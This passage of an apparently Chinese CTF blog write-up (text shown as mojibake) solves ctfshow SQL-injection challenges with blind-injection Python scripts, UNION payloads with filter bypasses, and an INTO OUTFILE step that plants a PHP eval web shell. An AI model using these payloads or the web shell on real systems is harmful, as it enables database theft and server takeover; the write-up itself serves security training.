class="string">&quot;http://b1c54244-c67c-41e9-80af-c6c916ee3cf2.challenge.ctf.show/api/v4.php?id=1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">uuid=string.ascii_lowercase+<span class="string">&quot;-&#125;&#123;&quot;</span>+string.digits</span><br><span class="line">flag=<span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">46</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> uuid:    </span><br><span class="line">        payload = <span class="string">f&quot;and trim(leading &#x27;<span class="subst">&#123;flag&#125;</span><span class="subst">&#123;j&#125;</span>&#x27; from (select group_concat(password) from ctfshow_user4 where username = &#x27;flag&#x27;))=trim(leading &#x27;<span class="subst">&#123;flag&#125;</span>.&#x27; from (select group_concat(password) from ctfshow_user4 where username = &#x27;flag&#x27;))--%20&quot;</span>.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">        res = requests.get(url+payload)</span><br><span class="line">        <span class="built_in">print</span>(j)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag=&quot;</span>,flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul></li></ul><h4><span id="web175">web175</span></h4><p><code>if(!preg_match(&#39;/[\x00-\x7f]/i&#39;, json_encode($ret)))</code></p><p><strong>\xnn åŒ¹é…ASCIIä»£ç ä¸­åå…­è¿›åˆ¶ä»£ç ä¸ºnnçš„å­—ç¬¦<br>[\x00-\x7f] åŒ¹é…ASCIIå€¼ä»0-127çš„å­—ç¬¦</strong></p><p>æ‰€ä»¥ASCIIå€¼å¾—0-127éƒ½è¢«è¿‡æ»¤äº†ï¼Œselectæ²¡æ³•ç”¨äº†ã€‚</p><ul><li><p>æ–¹æ³•ä¸€ï¼šå†™æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(password) from ctfshow_user5 into outfile &#x27;/var/www/html/1.txt&#x27;-- -</span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®1.txtå¯ä»¥è·å¾—flag</p></li><li><p>æ–¹æ³•äºŒï¼šå†™shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,&#x27;&lt;?=eval($_POST[1])?&gt;&#x27; into outfile &#x27;/var/www/html/1.php&#x27; --+</span><br></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨èšå‰‘è¿æ¥ï¼Œè¿ä¸ä¸Šå°±é‡æ–°è¯•ä¸€ä¸‹ï¼Œå‘ç°<code>/var/www/html/api/config.php</code>ä¸­æœ‰é…ç½®æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-11-01 14:21:14</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-11-01 19:29:25</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$dbhost</span> =<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dbpwd</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;ctfshow_web&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$charName</span> = <span class="string">&quot;utf-8&quot;</span>; </span><br></pre></td></tr></table></figure><p>é€šè¿‡èšå‰‘è¿æ¥æ•°æ®åº“</p><p><img src="/2023/04/19/ctfshow-Web%E7%AF%87/disda/Desktop/Disda/hexo/source/_posts/ctfshow-Web%E7%AF%87/image-20230524163039803.png" alt="image-20230524163039803"></p></li><li><p>æ–¹æ³•ä¸‰ï¼šæ—¶é—´ç›²æ³¨</p><p><code>1&#39; and sleep(6)--+</code>è¯•ä¸€ä¸‹ï¼Œå‘ç°æœ‰å»¶è¿Ÿï¼Œå¯ä»¥è€ƒè™‘æ—¶é—´ç›²æ³¨ã€‚</p><blockquote><p>å‘ç°ç¡®å®æœ‰å»¶è¿Ÿï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘æ—¶é—´ç›²æ³¨ã€‚<br>æ—¶é—´ç›²æ³¨ï¼š<br>é€šè¿‡æ—¶é—´å‡½æ•°ä½¿SQLè¯­å¥æ‰§è¡Œæ—¶é—´å»¶é•¿ï¼Œä»é¡µé¢å“åº”æ—¶é—´åˆ¤æ–­æ¡ä»¶æ˜¯å¦æ­£ç¡®çš„ä¸€ç§æ³¨å…¥æ–¹å¼ã€‚ç®€å•è¯´å°±æ˜¯ï¼Œå½“é¡µé¢å‡ºç°å»¶æ—¶å“åº”ï¼Œä¸”å“åº”æ—¶é—´ä¸è®¾å®šçš„æ—¶é—´å‡½æ•°ä¸€è‡´ï¼Œåˆ™è¡¨ç¤ºå‰åŠéƒ¨åˆ†çš„çŒœæµ‹æ­£ç¡®ï¼Œè‹¥å‡ºç°æŸ¥è¯¢ç›´æ¥è¿”å›ç»“æœï¼Œé¡µé¢å“åº”æœªå‡ºç°å»¶è¿Ÿï¼Œåˆ™è¯´æ˜æœªæ‰§è¡Œåˆ°æ—¶é—´å‡½æ•°çš„éƒ¨åˆ†ï¼Œandçš„åˆ¤æ–­ä¸­ï¼Œå‰åŠéƒ¨åˆ†å°±å·²ç»å‡ºé”™äº†ã€‚<br>åˆ©ç”¨è„šæœ¬æ¥è·å–flagã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/5/24 16:46</span></span><br><span class="line"><span class="string">    @Describe </span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://74c7c36e-f70f-4d72-b9a8-1c4ca45b3b35.challenge.ctf.show/api/v5.php&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    length = <span class="built_in">len</span>(flag)</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span> = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        j = <span class="built_in">min</span> + (<span class="built_in">max</span> - <span class="built_in">min</span>) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">min</span> == j:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload = <span class="string">&quot;?id=&#x27; union select &#x27;a&#x27;,if(ascii(substr((select group_concat(password) from ctfshow_user5 where username=&#x27;flag&#x27;),%d,1))&lt;%d,sleep(0.5),1) -- -&quot;</span> % (i, j)</span><br><span class="line">        start_time = time()</span><br><span class="line">        r = requests.get(url=url + payload).text</span><br><span class="line">        end_time = time()</span><br><span class="line">        <span class="comment"># print(r)</span></span><br><span class="line">        <span class="keyword">if</span> end_time - start_time &gt; <span class="number">0.48</span>:</span><br><span class="line">            <span class="built_in">max</span> = j</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = j</span><br></pre></td></tr></table></figure></li></ul><h4><span id="web176">web176</span></h4><p>çŸ¥é“æœ‰è¿‡æ»¤ï¼Œä½†ä¸çŸ¥é“è¿‡æ»¤çš„æ˜¯è°ï¼Œæ‰€ä»¥éœ€è¦å°è¯•ä¸€ä¸‹ã€‚<br>é¦–å…ˆä¼ å…¥<code>1â€™--+</code>ï¼Œæœ‰å›æ˜¾ã€‚<br>ä¼ å…¥<code>1â€™ --+</code>ï¼Œæœ‰å›æ˜¾ï¼Œç©ºæ ¼æ²¡è¢«è¿‡æ»¤ã€‚<br>ä¼ å…¥<code>1&#39; union select database(),2,3 --+</code><br>æ˜¾ç¤ºä¸å‡ºæ•°æ®åº“ï¼ŒçŒœæµ‹æœ‰çš„å­—æ¯è¢«è¿‡æ»¤ï¼Œéƒ½è¯•äº†ä¸€ä¸‹ï¼Œäºæ˜¯å‘ç°å½“ä¼ å…¥<code>1&#39; union Select database(),2,3 --+</code><br>è¯´æ˜æ˜¯selectè¢«è¿‡æ»¤ï¼Œä½†å¤§å°å†™å¯ç»•è¿‡ï¼Œæ‰€ä»¥ç›´æ¥ä¼ å…¥<br><code>-1&#39; union Select password,2,3 from ctfshow_user --+</code></p><p>å¾—åˆ°flagã€‚</p><h4><span id="web177">web177</span></h4><p>å°è¯•äº†ä¸‰ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1â€™--+</span><br><span class="line">1â€™%23</span><br><span class="line">1â€™ %23</span><br></pre></td></tr></table></figure><p>ç¡®å®šäº†è¿‡æ»¤äº†ç©ºæ ¼å’Œâ€“+ï¼Œå¯ä»¥ç”¨%0aå’Œ%23ä»£æ›¿ã€‚</p><ul><li>ä¸‡èƒ½å¯†ç ï¼š</li></ul><p><code>1&#39;%0aor%0a1=1%23</code></p><ul><li><p>å¸¸è§„è§£æ³•</p><ul><li><p>å…¨æ˜¾ç¤º<code>-1&#39;union%0aselect%0apassword,1,2%0afrom%0actfshow_user%23</code></p></li><li><p>åªç­”æ¡ˆ<code>-1&#39;union%0aselect%0aid,username,password%0afrom%0actfshow_user%0awhere%0ausername=&#39;flag&#39;%23</code></p></li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># çˆ†æ•°æ®åº“</span><br><span class="line">-1&#x27;%0aunion%0aselect%0a1,2,database()%23</span><br><span class="line"># æŸ¥è¡¨å</span><br><span class="line">-1&#x27;union%0aselect%0a1,2,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&quot;ctfshow_web&quot;%23</span><br><span class="line"># æŸ¥åˆ—å(å¯çœç•¥ï¼Œå› ä¸ºè¿™é“é¢˜æ˜¾ç¤ºå‡ºæ¥äº†)</span><br><span class="line">-1&#x27;union%0aselect%0a1,2,group_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name=&quot;ctfshow_user&quot;%23</span><br><span class="line"># çˆ†å­—æ®µ</span><br><span class="line">-1&#x27;union%0aselect%0aid,username,password%0afrom%0actfshow_user%23</span><br></pre></td></tr></table></figure><h4><span id="web179">web179</span></h4><p>å‘ç°è¿™æ¬¡æ˜¯%0aè¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨%0cæ›¿ä»£%0aã€‚</p><h4><span id="web180">web180</span></h4><p>ä¼ å…¥1â€™%23ï¼Œå‘ç°%23è¢«è¿‡æ»¤äº†ã€‚</p><p>åè¾¹æ²¡åŠæ³•æ³¨é‡Šäº†ï¼Œè¿˜å¯ä»¥ç”¨â€™1â€™&#x3D;â€™1æ¥é—­åˆåè¾¹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union%0cselecT%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%0cwhere%0c&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or(id=26)and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>ä¼ è¿›å»åå˜æˆäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where username !=&#x27;flag&#x27; and id = &#x27;&#x27;or(id=26)and&#x27;1&#x27;=&#x27;1&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure><p>å› ä¸ºandçš„ä¼˜å…ˆçº§å¤§äºoræ‰€ä»¥ç›¸å½“äº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where ï¼ˆusername !=&#x27;flag&#x27; and id = &#x27;&#x27;)  or  (id=26and&#x27;1&#x27;=&#x27;1&#x27;)</span><br></pre></td></tr></table></figure><p>orå·¦è¾¹ä¸º0å³è¾¹ä¸º1ï¼Œwhereçš„æ¡ä»¶ä¸º1ï¼Œè€Œä¸”flagåˆšå¥½åœ¨id&#x3D;26ã€‚</p><p>æˆ–è€…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;or(username=concat(&#x27;fl&#x27;,&#x27;ag&#x27;))and&#x27;a&#x27;=&#x27;a</span><br></pre></td></tr></table></figure><h4><span id="web183">web183</span></h4><blockquote><p> åªèƒ½ç›²æ³¨äº†ï¼Œåˆ©ç”¨%åœ¨sqlä¸­é€šé…å¤šä¸ªå­—ç¬¦ï¼Œåˆ©ç”¨_é€šé…ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚<br>æˆåŠŸåä¼šå‘ç°å‘ç°è¿”å›ç»“æœ  $user_count&#x3D;1ä»£è¡¨åŒ¹é…åˆ°äº†ä¸€ä¸ªï¼Œåˆ©ç”¨æ­¤æ¨¡å¼ç›²æ³¨ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url = <span class="string">&quot;http://9ae11c4b-7472-42b5-9064-5ebe182da98c.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line">letter = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        data = &#123;<span class="string">&quot;tableName&quot;</span>: <span class="string">&quot;(ctfshow_user)where(pass)like&#x27;&#123;&#125;%&#x27;&quot;</span>.<span class="built_in">format</span>(flag + j)&#125;</span><br><span class="line">        r = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="comment"># print(r)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">            sys.exit()</span><br></pre></td></tr></table></figure><h4><span id="web184">web184</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : Yn8rt</span></span><br><span class="line"><span class="comment"># @Time    : 2021/7/27 15:04</span></span><br><span class="line"><span class="comment"># @Function:</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://db10ab59-cf2e-4210-a875-b4c3926cc7ce.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">letter = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">asc2hex</span>(<span class="params">s</span>):</span><br><span class="line">    a1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    a2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        a1+=<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))</span><br><span class="line">    a2 = a1.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> a2</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user group by pass having pass like &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;0x&quot;</span>+asc2hex(flag+j+<span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url=url,data=payload).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                sys.exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨likeæ¥çˆ†ç ´</p><h4><span id="web185">web185</span></h4><p>mysqlä¸­çš„åˆ©ç”¨å­—ç¬¦ç»„åˆæˆçš„æ•°å­—ï¼š</p><p><img src="/2023/04/19/ctfshow-Web%E7%AF%87/disda/Desktop/Disda/hexo/source/_posts/ctfshow-Web%E7%AF%87/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : Yn8rt</span></span><br><span class="line"><span class="comment"># @Time    : 2021/7/27 21:52</span></span><br><span class="line"><span class="comment"># @Function:</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createNum</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            num += <span class="string">&quot;+true&quot;</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createstrNum</span>(<span class="params">m</span>):</span><br><span class="line">    _<span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> m:</span><br><span class="line">        _<span class="built_in">str</span> += <span class="string">&quot;,chr(&quot;</span> + createNum(<span class="built_in">ord</span>(j)) + <span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> _<span class="built_in">str</span>[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://282b6260-a1f9-437d-98f1-a7fb46d977a5.challenge.ctf.show:8080/select-waf.php&quot;</span></span><br><span class="line">letter = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&#x27;ctfshow_user group by pass having pass like concat(&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(createstrNum(flag + j + <span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="web187">web187</span></h4><p>md5($pass,true)ç»•è¿‡</p><blockquote><p>md5(string,raw)å…¶ä¸­rawå‚æ•°å¯é€‰ï¼Œä¸”æœ‰ä¸¤ç§é€‰æ‹©</p><p>FALSEï¼š32ä½16è¿›åˆ¶çš„å­—ç¬¦ä¸²<br>TRUEï¼š16ä½åŸå§‹äºŒè¿›åˆ¶æ ¼å¼çš„å­—ç¬¦ä¸²<br>å½“æœ‰trueè¿™ä¸ªå‚æ•°ï¼Œä¼šä»¥äºŒè¿›åˆ¶çš„å½¢å¼è¾“å‡º16ä¸ªå­—ç¬¦ã€‚è¿”å›çš„è¿™ä¸ªåŸå§‹äºŒè¿›åˆ¶ä¸æ˜¯æ™®é€šçš„0 1äºŒè¿›åˆ¶ã€‚</p></blockquote><p>å†çœ‹ä¸‹ä¸€ä¸ªçŸ¥è¯†ç‚¹</p><p>åœ¨mysqlé‡Œé¢ï¼Œåœ¨ç”¨ä½œå¸ƒå°”å‹åˆ¤æ–­æ—¶ï¼Œä»¥1å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšæ•´å‹æ•°ã€‚è¦æ³¨æ„çš„æ˜¯è¿™ç§æƒ…å†µæ˜¯å¿…é¡»è¦æœ‰å•å¼•å·æ‹¬èµ·æ¥çš„ï¼Œæ¯”å¦‚password&#x3D;â€˜xxxâ€™ or â€˜1xxxxxxxxxâ€™ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºpassword&#x3D;â€˜xxxâ€™ or 1 ï¼Œä¹Ÿå°±ç›¸å½“äºpassword&#x3D;â€˜xxxâ€™ or trueï¼Œæ‰€ä»¥è¿”å›å€¼å°±æ˜¯trueã€‚å½“ç„¶åœ¨æˆ‘åæ¥æµ‹è¯•ä¸­å‘ç°ï¼Œä¸åªæ˜¯1å¼€å¤´ï¼Œåªè¦æ˜¯æ•°å­—å¼€å¤´éƒ½æ˜¯å¯ä»¥çš„ã€‚<br>å½“ç„¶å¦‚æœåªæœ‰æ•°å­—çš„è¯ï¼Œå°±ä¸éœ€è¦å•å¼•å·ï¼Œæ¯”å¦‚password&#x3D;â€˜xxxâ€™ or 1ï¼Œé‚£ä¹ˆè¿”å›å€¼ä¹Ÿæ˜¯trueã€‚ï¼ˆxxxæŒ‡ä»£ä»»æ„å­—ç¬¦ï¼‰</p><p>å› æ­¤æˆ‘ä»¬æ„é€ ä¸€ä¸ªpassä½¿å¾—md5åæ˜¯<code>â€˜xxxâ€™ or æ•°å­—å¼€å¤´ </code>ï¼Œå‘ç°<code>ffifdyop</code>å¯ä»¥è¾¾åˆ°æ­¤æ•ˆæœ</p><h4><span id="web-188">web 188</span></h4><p>mysqlä¸­å­—æ¯ä¸æ•°å­—çš„æ¯”è¾ƒè¿‡ç¨‹ï¼š</p><p>ä½ å¯ä»¥å°è¯•ä¸€ä¸‹åœ¨æ•°æ®åº“ä¸­ä½¿ç”¨è¿™æ ·çš„è¯­å¥ï¼š<br>select * from stu where name&#x3D;0å¾ˆæœ‰å¯èƒ½æ˜¯èƒ½æŸ¥è¯¢å‡ºä¸œè¥¿çš„ï¼Œå³ä½¿ä½ æ²¡æœ‰nameä¸º0çš„æ•°æ®</p><p>è¿™æ˜¯å› 